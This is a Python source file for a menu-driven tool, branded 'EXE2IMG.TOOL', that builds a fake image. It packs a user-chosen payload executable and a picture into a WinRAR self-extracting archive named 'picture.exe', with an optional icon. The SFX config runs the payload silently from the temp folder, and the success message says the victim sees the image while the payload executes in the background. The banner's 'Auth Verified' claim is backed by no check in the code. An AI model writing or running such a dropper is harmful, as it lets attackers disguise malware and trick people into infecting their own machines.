import os
import sys
import subprocess
import shutil
import random
import re

# ──────────────────────────────────────────────────────────────────────
# Banner ASCII
# ──────────────────────────────────────────────────────────────────────
BANNER = [
    " _   _              _   _______   __ _____ _       ________  ________ ",
    "| \ | |            | | |  ___\ \ / /|  ___| |     |_   _|  \/  |  __ \ ",
    "|  \| | ___ _ __ __| | | |__  \ V / | |__ | |_ ___  | | | .  . | |  \/ ",
    "| . ` |/ _ \ '__/ _` | |  __| /   \ |  __|| __/ _ \ | | | |\/| | | __  ",
    "| |\  |  __/ | | (_| |_| |___/ /^\ \| |___| || (_) || |_| |  | | |_\ \ ",
    "\_| \_/\___|_|  \__,_(_)____/\/   \/\____/ \__\___/\___/\_|  |_/\____/"
]

# ──────────────────────────────────────────────────────────────────────
# Terminal Utilities
# ──────────────────────────────────────────────────────────────────────
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def c(text, code):
    return f"\033[38;5;{code}m{text}\033[0m"

Y1 = lambda t: c(t, 220)
Y2 = lambda t: c(t, 214)
Y3 = lambda t: c(t, 228)
W  = lambda t: c(t, 255)
G  = lambda t: c(t, 118)
R  = lambda t: c(t, 196)
C  = lambda t: c(t, 81)
M  = lambda t: c(t, 129)
GY = lambda t: c(t, 245)

# ──────────────────────────────────────────────────────────────────────
# Layout Constants
# ──────────────────────────────────────────────────────────────────────
def strip_ansi(text):
    return re.sub(r'\033\[[0-9;]*m', '', text)

IW = max(len(strip_ansi(line)) for line in BANNER)

TAG1 = "EXE2IMG.TOOL  v1.0"
TAG2 = "Fake Image Builder"
NOTICE = "Authorized Security Testing Tool  [✓] Auth Verified"

def top_border():
    return Y2('  ┌' + '─' * (IW + 2) + '┐')

def mid_border():
    return Y2('  ├' + '─' * (IW + 2) + '┤')

def bot_border():
    return Y2('  └' + '─' * (IW + 2) + '┘')

def side(content):
    raw_len = len(strip_ansi(content))
    pad = IW - raw_len
    if pad < 0:
        pad = 0
    return Y2('  │ ') + content + (' ' * pad) + Y2(' │')

def sep_line():
    return Y2('  │ ') + GY('─' * IW) + Y2(' │')

# ──────────────────────────────────────────────────────────────────────
# Banner
# ──────────────────────────────────────────────────────────────────────
def print_banner():
    print()
    print(top_border())
    for line in BANNER:
        print(side(Y2(line)))
    print(mid_border())
    left_tag = f"  {TAG1}"
    right_tag = f"{TAG2}  "
    tag_line = left_tag + '.' * (IW - len(strip_ansi(left_tag)) - len(strip_ansi(right_tag))) + right_tag
    print(side(Y3(tag_line)))
    print(mid_border())
    print(side(W(NOTICE)))
    print(bot_border())
    print()


# ──────────────────────────────────────────────────────────────────────
# Main Application
# ──────────────────────────────────────────────────────────────────────
class EXEtoImageBuilder:
    def __init__(self):
        self.output_folder = os.path.join(os.getcwd(), 'output')
        self.winrar_path = self.find_winrar()
        self.icon_path = None
        self.image_path = None
        self.payload_path = None
        self.output_name = 'picture.exe'

    def find_winrar(self):
        possible_paths = [
            'C:\\Program Files\\WinRAR\\WinRAR.exe',
            'C:\\Program Files (x86)\\WinRAR\\WinRAR.exe',
            'C:\\WinRAR\\WinRAR.exe'
        ]
        for path in possible_paths:
            if os.path.exists(path):
                return path
        return None

    def _spinner(self, msg, seconds=0.4):
        import time
        for _ in range(3):
            for dot in ['.', '..', '...']:
                print(f'\r{msg}{dot}', end='', flush=True)
                time.sleep(seconds / 3)
        print('\r' + ' ' * (len(msg) + 6), end='\r')

    def _status_line(self, label, value, color=Y1):
        if value:
           return f"  {color('▸')} {Y3(label)} {G('✔')} {self.trunc(value)}"
        return f"  {color('▸')} {Y3(label)} {R('✘ Not Set')}"

    def trunc(self, text, max_len=IW-12):
        s = strip_ansi(text)
        if len(s) <= max_len:
            return text
        return text[:max_len-3] + '...'

    def print_status(self):
        print(top_border())
        print(side(Y1('  ══  CURRENT CONFIGURATION  ══')))
        print(mid_border())

        if self.winrar_path:
            print(side(self._status_line('WinRAR', self.trunc(self.winrar_path), G)))
        else:
            print(side(self._status_line('WinRAR', None)))

        if self.icon_path:
            print(side(self._status_line('Icon', self.trunc(self.icon_path), G)))
        else:
            print(side(self._status_line('Icon', None)))

        if self.image_path:
            print(side(self._status_line('Image', self.trunc(os.path.basename(self.image_path)), G)))
        else:
            print(side(self._status_line('Image', None)))

        if self.payload_path:
            print(side(self._status_line('Payload', self.trunc(os.path.basename(self.payload_path)), G)))
        else:
            print(side(self._status_line('Payload', None)))

        print(side(self._status_line('Output', self.output_name, G)))
        print(bot_border())

    def print_menu(self):
        print(top_border())
        print(side(Y1('  ══  ACTIONS  ══')))
        print(mid_border())
        print(side(f'  {Y2("[1]")} {W("Set Custom Icon")}'))
        print(side(f'  {Y2("[2]")} {W("Set Background Image")}'))
        print(side(f'  {Y2("[3]")} {W("Set Payload EXE")}'))
        print(side(f'  {Y2("[4]")} {W("Set Output Filename")}'))
        print(sep_line())
        print(side(f'  {G("[B]")} {Y1("BUILD Fake Image")}'))
        print(side(f'  {R("[Q]")} {W("Quit")}'))
        print(bot_border())

    def set_icon(self):
        clear_screen()
        print_banner()
        print(top_border())
        print(side(Y1('  ══  SET ICON (optional)  ══')))
        print(bot_border())
        print()
        path = input(f'  {Y2("▸")} {W("Enter path to .ico file")} {GY("(Enter to skip)")}: ').strip()
        if not path:
            self.icon_path = None
            print(f'  {GY("[i] Icon not set.")}')
        elif not os.path.exists(path) or not path.lower().endswith('.ico'):
            print(f'  {R("[!] Invalid or missing .ico – icon not set.")}')
            self.icon_path = None
        else:
            self.icon_path = path
            print(f'  {G("[✓]")} {W("Icon set:")} {Y3(path)}')
        self._spinner('  Returning to menu')
        clear_screen()

    def set_image(self):
        clear_screen()
        print_banner()
        print(top_border())
        print(side(Y1('  ══  SET BACKGROUND IMAGE  ══')))
        print(bot_border())
        print()
        path = input(f'  {Y2("▸")} {W("Enter full path to image (jpg/png)")}: ').strip()
        if not os.path.exists(path) or not path.lower().endswith(('.jpg', '.jpeg', '.png')):
            print(f'  {R("[!] ERROR: Invalid or missing image file!")}')
            input(f'  {GY("Press Enter to continue...")}')
        else:
            self.image_path = path
            print(f'  {G("[✓]")} {W("Image set:")} {Y3(os.path.basename(path))}')
        self._spinner('  Returning to menu')
        clear_screen()

    def set_payload(self):
        clear_screen()
        print_banner()
        print(top_border())
        print(side(Y1('  ══  SET PAYLOAD EXE  ══')))
        print(bot_border())
        print()
        path = input(f'  {Y2("▸")} {W("Enter full path to payload.exe")}: ').strip()
        if not os.path.exists(path) or not path.lower().endswith('.exe'):
            print(f'  {R("[!] ERROR: Invalid or missing payload!")}')
            input(f'  {GY("Press Enter to continue...")}')
        else:
            self.payload_path = path
            print(f'  {G("[✓]")} {W("Payload set:")} {Y3(os.path.basename(path))}')
        self._spinner('  Returning to menu')
        clear_screen()

    def set_output_name(self):
        clear_screen()
        print_banner()
        print(top_border())
        print(side(Y1('  ══  SET OUTPUT FILENAME  ══')))
        print(bot_border())
        print()
        name = input(f'  {Y2("▸")} {W("Output name")} {GY("(default: picture.exe)")}: ').strip()
        if not name:
            name = 'picture.exe'
        if not name.lower().endswith('.exe'):
            name += '.exe'
        self.output_name = name
        print(f'  {G("[✓]")} {W("Output file:")} {Y3(self.output_name)}')
        self._spinner('  Returning to menu')
        clear_screen()

    # ──────────────────────────────────────────────────────────────
    # SFX Build
    # ──────────────────────────────────────────────────────────────
    def create_sfx_config(self, temp_dir):
        config_content = (
            'Path=%TEMP%\\'
            '\nSilent=1'
            '\nOverwrite=1'
            '\nSetup={payload}'
            '\nTempMode'
            '\nTitle=Viewing image...'
            '\n'
        )
        config_path = os.path.join(temp_dir, 'sfx_config.txt')
        with open(config_path, 'w') as f:
            f.write(config_content.format(payload=os.path.basename(self.payload_path)))
        return config_path

    def build(self):
        clear_screen()
        print_banner()

        if not self.winrar_path:
            print(top_border())
            print(side(f'  {R("[!] WinRAR not found!")}'))
            print(side(f'  {W("Install WinRAR and try again.")}'))
            print(bot_border())
            input(f'\n  {GY("Press Enter to return...")}')
            return

        if not self.image_path or not self.payload_path:
            print(top_border())
            print(side(f'  {R("[!] Missing required files!")}'))
            print(side(f'  {W("You must set both Image and Payload.")}'))
            print(bot_border())
            input(f'\n  {GY("Press Enter to return...")}')
            return

        temp_dir = os.path.join(self.output_folder, f'temp_{random.randint(10000, 99999)}')
        os.makedirs(temp_dir, exist_ok=True)
        os.makedirs(self.output_folder, exist_ok=True)

        shutil.copy(self.payload_path, temp_dir)
        shutil.copy(self.image_path, temp_dir)

        new_image_path = os.path.join(temp_dir, 'photo.jpg')
        copied_image = os.path.join(temp_dir, os.path.basename(self.image_path))
        if os.path.exists(new_image_path):
            os.remove(new_image_path)
        os.rename(copied_image, new_image_path)

        config_path = self.create_sfx_config(temp_dir)

        sfx_module = os.path.join(os.path.dirname(self.winrar_path), 'Default.SFX')
        sfx_option = [f'-sfx{sfx_module}'] if os.path.exists(sfx_module) else []
        icon_option = ['-iicon' + self.icon_path] if self.icon_path else []
        output_exe = os.path.join(self.output_folder, self.output_name)

        command = [
            self.winrar_path, 'a', '-ep1', '-inul',
            *sfx_option,
            '-z' + config_path,
            *icon_option,
            output_exe,
            os.path.join(temp_dir, '*')
        ]

        print(top_border())
        print(side(Y1('  ══  BUILDING FAKE IMAGE  ══')))
        print(mid_border())
        print(side(f'  {W("WinRAR:")}          {Y3(self.trunc(self.winrar_path))}'))
        print(side(f'  {W("Image:")}           {Y3(os.path.basename(self.image_path))}'))
        print(side(f'  {W("Payload:")}         {Y3(os.path.basename(self.payload_path))}'))
        if self.icon_path:
            print(side(f'  {W("Icon:")}            {Y3(os.path.basename(self.icon_path))}'))
        print(side(f'  {W("Output:")}          {Y3(self.trunc(output_exe))}'))
        print(mid_border())

        self._spinner(f'  {GY("Creating SFX executable")}')
        result = subprocess.run(command, capture_output=True, text=True)

        if result.returncode == 0 and os.path.exists(output_exe):
            print(side(f'  {G("[✓] SUCCESS!")}'))
            print(side(f'  {G("Fake image created:")} {Y3(self.trunc(output_exe))}'))
            print(side(f'  {W("Victim double-clicks → sees image")}'))
            print(side(f'  {W("Payload executes silently in background")}'))
        else:
            print(side(f'  {R("[!] BUILD FAILED")}'))
            err = (result.stderr or result.stdout or 'Unknown error').strip()
            print(side(f'  {R(err[:IW-2])}'))

        print(bot_border())
        shutil.rmtree(temp_dir, ignore_errors=True)
        input(f'\n  {GY("Press Enter to return to menu...")}')
        clear_screen()

    # ──────────────────────────────────────────────────────────────
    # Main Loop
    # ──────────────────────────────────────────────────────────────
    def run(self):
        clear_screen()
        print_banner()

        while True:
            self.print_status()
            print()
            self.print_menu()
            print()
            choice = input(f'  {Y2("╰►")} {W("Select option")} {GY("[1-4/B/Q]")}: ').strip().lower()

            if choice == '1':
                self.set_icon()
            elif choice == '2':
                self.set_image()
            elif choice == '3':
                self.set_payload()
            elif choice == '4':
                self.set_output_name()
            elif choice == 'b':
                self.build()
            elif choice == 'q':
                print(f'\n  {Y3("Exiting... Stay sharp, operator.")}\n')
                break
            else:
                print(f'\n  {R("[!] Invalid option.")}')
                self._spinner('  Returning')


if __name__ == '__main__':
    builder = EXEtoImageBuilder()
    builder.run()